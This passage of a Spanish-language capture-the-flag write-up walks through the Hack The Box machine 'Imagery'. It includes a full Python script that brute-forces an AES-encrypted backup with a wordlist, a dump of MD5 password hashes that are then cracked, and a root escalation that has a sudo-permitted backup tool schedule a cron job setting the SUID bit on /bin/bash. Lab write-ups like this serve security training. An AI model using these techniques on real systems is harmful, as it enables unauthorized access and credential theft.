| *AES (Advanced Encryption Standard) es uno de los algoritmos de cifrado simétrico más utilizados en la actualidad. Fue adoptado como estándar por el gobierno de los EE. UU. en 2001, reemplazando a DES (Data Encryption Standard). Usa una sola clave para cifrar y descifrar los datos, ósea que, quien tenga la clave puede recuperar el mensaje original. AES cifra la información en bloques de 128 bits (16 bytes) y puede usar claves de 128, 192 o 256 bits.* |

Me apoyé mucho con **ChatGTP**, ya que no conozco el uso de la librería **pyAesCrypt**, que fue usada para encriptar este archivo.

Tengo un script hecho por **ChatGTP** que aplica fuerza bruta al archivo encriptado y él obtiene el contenido, guardándolo en un **archivo ZIP**.

Para usarlo, primero necesitamos tener instalada la librería **pyAesCrypt**.

Instalémosla usando un ambiente virtual de **Python3**:
```bash
python3 -m venv venv
source venv/bin/activate
pip install pyaescrypt
```

Aquí te dejo el script:
```python
#!/usr/bin/env python3
"""
bruteforce_aes.py
Brute-force a un archivo .aes usando pyAesCrypt y un wordlist.
Verifica el resultado comprobando el magic bytes de ZIP ("PK\x03\x04").
Uso:
  python3 bruteforce_aes.py -f web_20250806_120723.zip.aes -w wordlist.txt
Opciones:
  -f --file       : archivo .aes objetivo
  -w --wordlist   : wordlist (una contraseña por línea)
  -b --buffer     : buffer size en bytes (por defecto 64KB)
  -s --startline  : línea de inicio (útil para reanudar) (1-indexed)
  -v --verbose    : modo verboso
"""
import argparse
import tempfile
import os
import sys
import pyAesCrypt
import shutil

ZIP_MAGIC = b"PK\x03\x04"

def try_password(aes_file, password, buffer_size):
    # escribe a un fichero temporal
    fd, tmp_path = tempfile.mkstemp(prefix="aescrack_", suffix=".dec")
    os.close(fd)
    try:
        # pyAesCrypt.decryptFile(inFile, outFile, password, bufferSize)
        pyAesCrypt.decryptFile(aes_file, tmp_path, password, buffer_size)
    except Exception as e:
        # La decryption falló: limpiamos y devolvemos False
        try:
            os.remove(tmp_path)
        except Exception:
            pass
        return False, str(e)
    # Si decryptFile no lanzó error, comprobamos magic bytes
    try:
        with open(tmp_path, "rb") as f:
            head = f.read(4)
    except Exception as e:
        try:
            os.remove(tmp_path)
        except Exception:
            pass
        return False, "no_read"
    if head.startswith(ZIP_MAGIC):
        # éxito
        return True, tmp_path
    else:
        # no es un ZIP válido: borramos
        try:
            os.remove(tmp_path)
        except Exception:
            pass
        return False, "magic_mismatch"

def main():
    parser = argparse.ArgumentParser(description="Brute-force .aes with pyAesCrypt (lab only)")
    parser.add_argument("-f", "--file", required=True, help="archivo .aes objetivo")
    parser.add_argument("-w", "--wordlist", required=True, help="wordlist (una contraseña por línea)")
    parser.add_argument("-b", "--buffer", type=int, default=64*1024, help="buffer size en bytes (default 65536)")
    parser.add_argument("-s", "--startline", type=int, default=1, help="línea desde la que empezar (1-indexed)")
    parser.add_argument("-v", "--verbose", action="store_true", help="modo verboso")
    args = parser.parse_args()

    aes_file = args.file
    wordlist = args.wordlist
    buf = args.buffer
    start = max(1, args.startline)

    if not os.path.isfile(aes_file):
        print("Error: archivo AES no encontrado:", aes_file)
        sys.exit(1)
    if not os.path.isfile(wordlist):
        print("Error: wordlist no encontrada:", wordlist)
        sys.exit(1)

    total = None
    try:
        # contar líneas para info (si es grande puede tardar; ignoramos si falla)
        with open(wordlist, "rb") as f:
            total = sum(1 for _ in f)
    except Exception:
        total = None

    print(f"Objetivo: {aes_file}")
    print(f"Wordlist: {wordlist} (total aprox: {total or 'desconocido'})")
    print(f"Buffer size: {buf} bytes")
    print(f"Comenzando en línea: {start}")
    print("Presiona Ctrl+C para detener y poder reanudar después con --startline.")

    try:
        with open(wordlist, "r", errors="ignore") as w:
            for lineno, raw in enumerate(w, start=1):
                if lineno < start:
                    continue
                pw = raw.rstrip("\r\n")
                if not pw:
                    continue
                if args.verbose:
                    print(f"[{lineno}] Probando: {pw!r} ...", end="", flush=True)
                success, info = try_password(aes_file, pw, buf)
                if success:
                    dec_path = info
                    print("\n\n=== CONTRASEÑA ENCONTRADA ===")
                    print("Línea:", lineno)
                    print("Password:", pw)
                    print("Fichero desencriptado válido:", dec_path)
                    print("Puedes moverlo con: mv", dec_path, "./recovered.zip")
                    # opcional: renombrar automáticamente
                    try:
                        shutil.move(dec_path, os.path.join(os.getcwd(), "recovered.zip"))
                        print("Movido a recovered.zip")
                    except Exception:
                        pass
                    return 0
                else:
                    if args.verbose:
                        print(" fallo ->", info)
                    else:
                        # imprimimos progreso simple
                        if lineno % 100 == 0:
                            print(f"Probadas {lineno} contraseñas...", flush=True)
    except KeyboardInterrupt:
        print("\nDetenido por usuario. Puedes reanudar usando --startline", lineno+1)
        return 2

    print("\nFin de wordlist — contraseña NO encontrada.")
    return 1

if __name__ == "__main__":
    sys.exit(main())
```
Antes de ejecutarla, te recomiendo darle permisos de ejecución con **chmod**.

Ejecutemos el script:
```bash
python3 bruteforce_aes.py -f web_20250806_120723.zip.aes -w /usr/share/wordlists/rockyou.txt
Objetivo: web_20250806_120723.zip.aes
Wordlist: /usr/share/wordlists/rockyou.txt (total aprox: 14344392)
Buffer size: 65536 bytes
Comenzando en línea: 1
Presiona Ctrl+C para detener y poder reanudar después con --startline.
Probadas 100 contraseñas...
Probadas 200 contraseñas...
Probadas 300 contraseñas...
Probadas 400 contraseñas...
Probadas 500 contraseñas...
Probadas 600 contraseñas...

=== CONTRASEÑA ENCONTRADA ===
Línea: 670
Password: bestfriends
Fichero desencriptado válido: /tmp/aescrack_wtozgzo0.dec
Puedes moverlo con: mv /tmp/aescrack_wtozgzo0.dec ./recovered.zip
Movido a recovered.zip
```
Excelente, tenemos la contraseña y tenemos el **archivo ZIP** resultante.

Vamos a descomprimirlo:
```bash
unzip recovered.zip
```

Esto nos dio un directorio llamado **web**, pues resulta ser un backup del servidor web de la máquina víctima:
```bash
cd web
ls
api_admin.py  api_auth.py  api_edit.py  api_manage.py  api_misc.py  api_upload.py  app.py  config.py  db.json  env  __pycache__  system_logs  templates  utils.py
```

Si revisamos el archivo **db.json**, veremos que contiene más usuarios que el que vimos en la página web aplicando el **LFI**:
```bash
cat db.json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ]
...
```
Tenemos la contraseña en **MD5** del **usuario mark y web**, que pertenecen a la máquina víctima.

Vamos a intentar crackearlas con **Crackstation**:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura37.png">
</p>

Tenemos las contraseñas.

Vamos a probar la del **usuario mark**:
```bash
web@Imagery:/var/backup$ cd /home/
web@Imagery:/home$ su mark
Password: 
mark@Imagery:/home$ whoami
mark
```
Funcionó.

En su directorio, encontraremos la flag del usuario:
```bash
mark@Imagery:/home$ cd mark/
mark@Imagery:~$ ls
user.txt
mark@Imagery:~$ cat user.txt
...
```

### Escalando Privilegios Abusando de Permisos Sudoers Sobre Binario charcol {#charcol}

Veamos qué privilegios tiene nuestro usuario:
```bash
mark@Imagery:~$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```
Podemos usar el binario **charcol** como **Root**.

No encontré información del binario **charcol**, pero al ejecutarlo, nos dice que es una herramienta **CLI** para crear **archivos ZIP** de copia de seguridad cifrados:
```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

Charcol is already set up.
To enter the interactive shell, use: charcol shell
To see available commands and flags, use: charcol help
mark@Imagery:~$ sudo /usr/local/bin/charcol help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system password verification).
```

Vamos a usar el comando **shell** para entrar en el **CLI** de **charcol**:
```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-04 08:09:59] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol>
```

Si usamos el comando **help** de **charcol**, veremos cómo es su uso, pero hay una forma que nos permite ejecutar comandos, metiéndolos dentro de una **tarea CRON**:
```bash
Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
```
Entonces, podemos crear una **tarea CRON** que le dé **permisos SUID** a la **Bash**.

Vamos a intentarlo, escribe el siguiente comando:
```bash
charcol> auto add --schedule "* * * * *" --command "chmod u+s /bin/bash" --name "Privesc"
[2025-10-04 08:10:07] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-10-04 08:10:23] [INFO] System password verified successfully.
[2025-10-04 08:10:23] [INFO] Auto job 'Privesc' (ID: fc56769c-f8ca-4d9d-8eac-d405d236d7da) added successfully. The job will run according to schedule.
[2025-10-04 08:10:23] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod u+s /bin/bash
charcol>
```
Al ejecutarlo, te pedirá la contraseña del **usuario mark** y, al final, vemos que sí se creó la **tarea CRON**.

Sal de **charcol** y espera un minuto, luego revisa los permisos de la **Bash**:
```bash
charcol> exit
[2025-10-04 08:10:28] [INFO] Exiting Charcol shell.
mark@Imagery:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1474768 Oct 26  2024 /bin/bash
```
Funcionó.

Ejecutemos la **Bash** con privilegios:
```bash
mark@Imagery:~$ bash -p
bash-5.2# whoami
root
```
Ya somos **Root**.

Obtengamos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# ls
chrome.deb  root.txt
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
